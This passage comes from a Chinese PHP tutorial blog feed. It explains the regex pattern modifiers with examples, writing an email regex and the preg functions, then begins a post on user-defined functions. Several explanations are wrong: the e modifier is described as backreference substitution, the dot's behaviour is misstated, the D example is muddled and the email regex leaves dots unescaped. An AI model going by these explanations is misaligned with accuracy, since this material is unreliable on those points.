<td align="center">m</td>
<td align="left">字符串视为多行</td>
</tr>
<tr>
<td align="center">s</td>
<td align="left">将字符串视为单行,换行符作为普通字符.</td>
</tr>
<tr>
<td align="center">x</td>
<td align="left">将模式中的空白忽略.</td>
</tr>
<tr>
<td align="center">A</td>
<td align="left">强制仅从目标字符串的开头开始匹配.</td>
</tr>
<tr>
<td align="center">D</td>
<td align="left">模式中的美元元字符仅匹配目标字符串的结尾.</td>
</tr>
<tr>
<td align="center">U</td>
<td align="left">匹配最近的字符串.</td>
</tr>
</tbody></table>
<p><font face="Comic sans MS">模式匹配符的用法如下：<font color="red"><strong>&#x2F; 正则表达示&#x2F;模式匹配符</strong></font> &amp;emsp;   <font color="#00B2EE">模式匹配符是放在正则表达式的最后的。</font><br></font>例如： &#x2F;\w+&#x2F;<font color="red"><strong>s</strong></font> </p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. i 不区分大小写</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php //在后面加上了一个i </span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/ABC/i&#x27;</span>; </span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;8988abc12313&#x27;</span>;</span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;11111ABC2222&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>; </span><br><span class="line">    var_dump(<span class="variable">$matches</span>); &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论，不论是$string还是$string1全都匹配成功了。因此，在后面加上了i之后，能够不共分匹配内容的大小写。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. m 视为多行</strong></font><br></font><font color="red">正则在匹配的时候，要匹配的目标字符串我们通常视为一行。</font><br><font color="#00B2EE"><strong>“行起始”元字符（^）</strong></font>仅仅匹配字符串的起始，<font color="#00B2EE"><strong>“行结束”元字符（$）</strong></font>仅仅匹配字符串的结束。<br>当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。<br><font color="red"><strong>注意：</strong></font><strong>如果要匹配的字符串中没有“\n”字符或者模式中没有 ^ 或 $，则设定此修正符没有任何效果。</strong></p>
<p>我们通过实验和代码来验证一下这个特点：<br>第一次匹配，你会发现匹配不成功：<font color="#FF6347">(1)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/^a\d+/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;我的未来在自己手中我需要不断的努力</span></span><br><span class="line"><span class="string">a9是一个不错的字符表示</span></span><br><span class="line"><span class="string">怎么办呢，其实需要不断奋进&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">    var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>第二次匹配，我们加上m 试试：<font color="#FF6347">(2)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/^a\d+/m&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;我的未来在自己手中我需要不断的努力</span></span><br><span class="line"><span class="string">a9是一个不错的字符表示</span></span><br><span class="line"><span class="string">怎么办呢，其实需要不断奋进&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">    var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(2) <span class="string">&quot;a9&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>哦耶！匹配成功了。&#x2F;^a\d+&#x2F; 匹配的内容是a9，必须得在行开始处。在第二行也被匹配成功了。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. s 视为一行</strong></font><br>如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。<br></font><br>第一次，不加模式匹配符s：<font color="#FF6347">(1)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/新的未来.+\d+/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;新的未来</span></span><br><span class="line"><span class="string">987654321&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>第二次，在正则表达示后面加上模式匹配符s:<font color="#FF6347">(2)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/新的未来.+\d+/s&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;新的未来</span></span><br><span class="line"><span class="string">987654321&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(22) <span class="string">&quot;新的未来 987654321&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：</p>
</blockquote>
<ol>
<li>因为在新的未来，未来后面有一个换行</li>
<li>而.(点)是匹配非空白字符以外的所有字符。因此，第一次不成功</li>
<li>第二次，加上了s模式匹配符。因为，加上后.（点）能匹配所有字符。</li>
</ol>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>4. x 忽略空白字符</strong></font></p>
<ol>
<li>如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略。</li>
<li>未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。</font></li>
</ol>
<ul>
<li><font color="#FF6347">(1)↓↓</font>我们先来实验一下忽略空白行等特性：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/a b c /x&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;学英语要从abc开始&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(3) <span class="string">&quot;abc&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这样也能匹配成功。<br>在$pattern里面有空格，每个abc后面有一个空格。而$string里面没有空格。<br>所以x忽略空白字符。</p>
</blockquote>
<ul>
<li><font color="#FF6347">(2)↓↓</font>而第二句话从字面上比较难理解：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//重点观察这一行</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/a b c #我来写一个注释</span></span><br><span class="line"><span class="string">/x&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;学英语要从abc开始&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(3) <span class="string">&quot;abc&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结果也匹配成功了！<br>我们发现，<font color="red">x的第二个特性是忽略：#字符和下一个换行符之间的字符也被忽略</font>。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>5. e 将匹配项找出来，进行替换</strong></font><br>e模式也叫逆向引用。主要的功能是将正则表达式括号里的内容取出来，放到替换项里面替换原字符串。<br>使用这个模式匹配符前必须要使用到<font color="#00B2EE"><strong>preg_replace()</strong></font>。<br><font color="red"><strong>mixed preg_replace ( mixed $正则表达式 , mixed $用于取代字符串的字串 , mixed $目标字符串)</strong></font><br><strong>preg_replace的功能：</strong>使用正则表达式 ，找到目标字符串。然后用’用于取代字符串的字串’进行替换。<br></font></p>
<p>在正式讲解前我们回顾一下之前的知识，我们故意的把每个要匹配的原子外面都加上括号：<font color="#FF6347">↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//加上了括号</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/(\d+)([a-z]+)(\d+)/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;987abc321&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$match</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(4) &#123; [0]=&gt; string(9) <span class="string">&quot;987abc321&quot;</span> [1]=&gt; string(3) <span class="string">&quot;987&quot;</span> [2]=&gt; string(3) <span class="string">&quot;abc&quot;</span> [3]=&gt; string(3) <span class="string">&quot;321&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这是我们之前讲括号的时候：匹配到的内容外面有括号。会把括号里面的内容，也放到数组的元素里面。如图中的：987、abc、321。</p>
</blockquote>
<p>&amp;emsp;<br>我们接下来看正则表达示中的e模式：<font color="#FF6347">↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;&#123;April 15, 2003&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="string">&#x27;w&#x27;</span>匹配字母，数字和下划线，<span class="string">&#x27;d&#x27;</span>匹配0-99数字，<span class="string">&#x27;+&#x27;</span>元字符规定其前导字符必须在目标对象中连续出现一次或多次</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;/&#123;(\w+) (\d+), (\d+)&#125;/i&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$replacement</span> = <span class="string">&quot;\$2&quot;</span>;</span><br><span class="line"></span><br><span class="line">//字符串被替换为与第 n 个被捕获的括号内的子模式所匹配的文本</span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">15</span><br></pre></td></tr></table></figure>

<blockquote>
</blockquote>
<p>结论：</p>
<ol>
<li>上例中$2 指向的是正则表达示的第一个(\d+)。相当于把15又取出来了</li>
<li>替换的时候，我写上$2。将匹配项取出来，用来再次替换匹配的结果。</li>
</ol>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>6. U 贪婪模式控制</strong></font><br>正则表达式默认是贪婪的，也就是尽可能的最大限度匹配。<br></font></p>
<p>我们来看看正则表达示是如何贪婪的：<font color="#FF6347">↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/&lt;div&gt;.*&lt;\/div&gt;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;&lt;div&gt;你好&lt;/div&gt;&lt;div&gt;我是&lt;/div&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$match</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(34) <span class="string">&quot;</span></span><br><span class="line"><span class="string">你好</span></span><br><span class="line"><span class="string">我是</span></span><br><span class="line"><span class="string">&quot;</span> &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>我们来看看结果，得到如下结论。它从“<br>你好”直接匹配到了“我是<br>”。进行了最大范围的匹配。</p>
</blockquote>
<p>&amp;emsp;<br>同样一段代码我们再加大写的U，再看看效果：<font color="#FF6347">↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/&lt;div&gt;.*&lt;\/div&gt;/U&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;&lt;div&gt;你好&lt;/div&gt;&lt;div&gt;我是&lt;/div&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$match</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(17) <span class="string">&quot;</span></span><br><span class="line"><span class="string">你好</span></span><br><span class="line"><span class="string">&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>我们发现，只匹配出来了：&lt;div&gt;你好&lt;&#x2F;div&gt;<br>这样，把正则的贪婪特性取消掉。让它找到了最近的匹配，就OK了。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>7. A 从目标字符串的开头开始匹配</strong></font><br>此模式类似于元字符中的^（抑扬符）效果。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/this/A&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;hello this is a &#x27;</span>;</span><br><span class="line">//<span class="variable">$string1</span> = <span class="string">&#x27;this is a &#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$match</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>结论：</strong><br>   1.如果加A模式修正符的时候匹配不出来$string，不加时能匹配出来<br>   2.如果加上了A模式修正符的时候能匹配出来$string1,因为必须要从开始处开始匹配</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>8. D 结束$符后不准有回车</strong></font><br>如果设定了此修正符，模式中的美元元字符仅匹配目标字符串的结尾。没有此选项时，如果最后一个字符是换行符的话，美元符号也会匹配此字符之前。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/\w+this$/&#x27;</span>; </span><br><span class="line"><span class="variable">$pattern1</span> = <span class="string">&#x27;/\w+this$/D&#x27;</span>; </span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;hellothis &quot;</span>; </span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern1</span>, <span class="variable">$string</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>; </span><br><span class="line">var_dump(<span class="variable">$match</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>结论：</strong><br>1.如pattern 在匹配$string的时候，$string的字符串this后有一个回车。在没有加D匹配符的时候也能匹配成功<br>2.如pattern 在匹配$string的时候，加上了D。$string的字符串this后有空格，匹配不成功。</p>
</blockquote>
<p>&amp;emsp;</p>
<h3 id="7-写正则的诀窍和常用正则"><a href="#7-写正则的诀窍和常用正则" class="headerlink" title="7. 写正则的诀窍和常用正则"></a><font face="Comic sans MS"  color="#FF6347">7. 写正则的诀窍和常用正则</font></h3><p><font face="Comic sans MS">写正则的诀窍</font><br>女孩和男孩恋爱时的诀窍通常是：测试你是不是对我好一点，如果是的，咱们的关系就更好一点。<br>而正则的诀窍和恋爱的诀窍基本一致：<font color="red">写一点、测一点。</font><br>因为，<strong>我们需要不断的正则，用preg_match对比是不是能匹配成功。成功了，再写后面的一点。直到写完，全部匹配成功为止！</strong><br><font face="Comic sans MS">例如，我要写一个邮箱的正则。我先要做的事情，将常用的邮箱格式全部列出来。例如：<br><a href="mailto:&#x70;&#104;&#112;&#99;&#110;&#x40;&#x70;&#104;&#112;&#x2e;&#x63;&#x6e;">&#x70;&#104;&#112;&#99;&#110;&#x40;&#x70;&#104;&#112;&#x2e;&#x63;&#x6e;</a> &amp;emsp; <a href="mailto:&#112;&#x68;&#x70;&#99;&#x6e;&#x40;&#99;&#111;&#114;&#112;&#x2e;&#x62;&#x61;&#x69;&#x64;&#117;&#x2e;&#x63;&#x6d;">&#112;&#x68;&#x70;&#99;&#x6e;&#x40;&#99;&#111;&#114;&#112;&#x2e;&#x62;&#x61;&#x69;&#x64;&#117;&#x2e;&#x63;&#x6d;</a> &amp;emsp; <a href="mailto:&#x70;&#104;&#x70;&#99;&#110;&#64;&#x31;&#50;&#x36;&#x2e;&#x63;&#x6f;&#x6d;">&#x70;&#104;&#x70;&#99;&#110;&#64;&#x31;&#50;&#x36;&#x2e;&#x63;&#x6f;&#x6d;</a>  &amp;emsp;<a href="mailto:&#112;&#104;&#x70;&#99;&#x6e;&#x40;&#x78;&#120;&#120;&#x2e;&#x63;&#111;&#109;">&#112;&#104;&#x70;&#99;&#x6e;&#x40;&#x78;&#120;&#120;&#x2e;&#x63;&#111;&#109;</a>  &amp;emsp;<a href="mailto:&#49;&#50;&#51;&#52;&#x35;&#64;&#113;&#113;&#46;&#x63;&#111;&#109;">&#49;&#50;&#51;&#52;&#x35;&#64;&#113;&#113;&#46;&#x63;&#111;&#109;</a><br></font></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">  常用的格式主要有这样一些。那我们就可以来分析：
    1.先匹配@之前的字符 \w+（因为是0-9A-Za-z_）
    2.第二个跟一个@符
    3.第三个再写上[a-zA-Z0-9-]+ 因为qq和126这些主域名是不能有下划线的
    4.corp.baidu. 或者是126. 通常邮箱后缀都是这样的。所以我们可以写成：([a-zA-Z0-9-]+.){1,2}
    5.上面的是将 **.** 转义，让它是本身的意思。括号重复的区间最少一次，最多两次。
    6.后面接下com|cn|org|gov.cn|net|edu.cn等就可以了
</font></td></tr></table>

<p>因此，我们的正则表达式我使用：<br>&#x2F;\w+@([a-zA-Z0-9-]+.){1,2}(com|cn|org|gov.cn|net|edu.cn)&#x2F;<br>或<br>&#x2F;\w+@([a-zA-Z0-9_]+)\.(com|cn|org|gov.cn|net|edu.cn)&#x2F;<br>邮箱的正则就被我写成功了。ฅʕ•̫͡•ʔฅ</p>
<p>&amp;emsp;</p>
<h3 id="8-常用正则函数"><a href="#8-常用正则函数" class="headerlink" title="8. 常用正则函数"></a><font face="Comic sans MS" color="#FF6347">8. 常用正则函数</font></h3><table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">preg_filter</td>
<td align="left">执行一个正则表达式搜索和替换</td>
</tr>
<tr>
<td align="center">preg_grep</td>
<td align="left">返回匹配模式的数组条目</td>
</tr>
<tr>
<td align="center">preg_match</td>
<td align="left">执行一个正则表达式匹配</td>
</tr>
<tr>
<td align="center">preg_match_all</td>
<td align="left">执行一个全局正则表达式匹配</td>
</tr>
<tr>
<td align="center">preg_replace_callback_array</td>
<td align="left">传入数组，执行一个正则表达式搜索和替换使用回调</td>
</tr>
<tr>
<td align="center">preg_replace_callback</td>
<td align="left">执行一个正则表达式搜索并且使用一个回调进行替换</td>
</tr>
<tr>
<td align="center">preg_replace</td>
<td align="left">执行一个正则表达式的搜索和替换</td>
</tr>
<tr>
<td align="center">preg_split</td>
<td align="left">通过一个正则表达式分隔字符串</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><strong>正则关于面试常遇到的问题</strong><br>面试中经常考到的几个正则达达示是：</p>
<ol>
<li>匹配邮箱</li>
<li>匹配手机号</li>
<li>匹配一个网址</li>
<li>用正则匹配某个格式，取出某个例</li>
<li>写一个采集器<br>其他….</li>
</ol>
<p>面试的第4题和第5题我对大家不担心，因为只要大家认真学习了我给的前五节的内容。第4，5题推理就行。<br>因为，通常在技术答题面试环节，是时候准许查手机的！  ヾ(๑╹◡╹)ﾉ”</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-函数</title>
    <url>/post/PHP-function/</url>
    <content><![CDATA[<p>PHP函数分为<font color="red"><strong>自定义函数</strong></font>和<font color="red"><strong>系统函数</strong></font> (oﾟvﾟ)ノ</p>
<span id="more"></span>

<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP 函数</font></center>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一-自定义函数"><a href="#一-自定义函数" class="headerlink" title="一. 自定义函数"></a><font color="#FF6347" face="Comic sans MS">一. 自定义函数</font></h3><h4 id="1-1-自定义函数函数基本概念"><a href="#1-1-自定义函数函数基本概念" class="headerlink" title="1.1 自定义函数函数基本概念"></a><font color="#3CB371" face="Comic sans MS">1.1 自定义函数函数基本概念</font></h4><p><font face="Comic sans MS">我们在实际开发过程当中需要有很多功能都需要反复使用到，而这些反复需要使用到的功能，我们能定义成功能（函数），就尽可能定义成功能（函数）。使用的时候，吼一下它的名字即可。<br>  那我们来学一下自定义函数的语法规定，语法规定如下：<br><font color="red"><br>  function 函数名([参数名1[&#x3D;值1], 参数名2[&#x3D;值2], 参数名n[&#x3D;值n]])<br>{<br>       函数中的功能体<br>    [return 返回值]<br>}<br></font><br></font></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**上面的语法规定中发现了如下特点，产生如下语未能规定：**</font>
1. 函数以<font color="red">**function**</font>开始
2. function后面接空格，空格后接函数名
3. 函数名与变量命名规则基本一样，但是不同的是：<font color="red">**函数名不区分大小写**</font>
4. 所谓参数其实就是变量
5. 函数名后接括号，括号内跟参数，参数全都有[]（中括号）括起来了，代表参数可填可不填
6. 如果有参数的话，参数后可以接(＝)等号，等号接默认值。参数值也是用[](中括号)括起来的，代表选填
7. 函数后的参数变量，主要功能是把函数体外的变量值，传入函数体内来使用，函数体的变量和函数体外的
   变量通常是两个不同的变量。
8. 函数中的具体功能（功能体）用大括号括起来，代表这是一个函数的功能区间
9. 函数可以有返回值也可以没有返回值，用[]（中括号）括起来的，代表选填。
10. return后接空格，空格后接返回值，若有return,return后的代码均不执行。(<font color="red">**return可用可不用**</font>)
11. 函数的执行没有顺序关系，可以在定义处之前的位置调用
12. 函数不能被定义两次，即函数不能被重载
</font></td></tr></table>

<p>&amp;emsp;</p>
<blockquote>
<p><font color="#00B2EE"><strong>1. 函数是条狗，哪里调用哪里哪，它就跟着你走</strong></font><br><font color="#00B2EE"><strong>2. 函数名只能是字母，数字，下划线的组合，并且之间不能包含空格，数字不能放在变量名首位。</strong></font><br><font color="#00B2EE"><strong>3. 函数名与变量命名规则一样，但是不同的是：</strong><font color="red"><strong>函数名不区分大小写</strong></font> </font><br><font color="#00B2EE"><strong>4. 函数体的参数若是定义了，未传参数，代码会报错</strong></font><br><font color="#00B2EE"><strong>5. 函数的参数如果有默认值，参数可以不填，代码也不会报错</strong></font><br><font color="#00B2EE"><strong>6. 函数的参数可以写多个</strong></font><br><font color="#00B2EE"><strong>7. 函数如果有默认值和无默认值的参数，通常把无默认值的参数写在最前面</strong></font><br><font color="#00B2EE"><strong>8. 函数体的变量与函数体外的变量没有关系</strong></font><br><font color="#00B2EE"><strong>9. 函数体中若有return,return 后的代码不执行</strong></font><br><font color="#00B2EE"><strong>10. 函数执行完后,return 可把函数体内的值，带带函数体外</strong></font><br><font color="#00B2EE"><strong>11. 函数的执行没有顺序关系，可以在定义处之前的位置调用</strong></font><br><font color="#00B2EE"><strong>12. 函数不能重载</strong></font></p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-回调函数"><a href="#1-2-回调函数" class="headerlink" title="1.2 回调函数"></a><font color="#3CB371" face="Comic sans MS">1.2 回调函数</font></h4><p><strong>一个函数作为另外一个函数的</strong><font color="red"><strong>参数</strong></font>。</p>
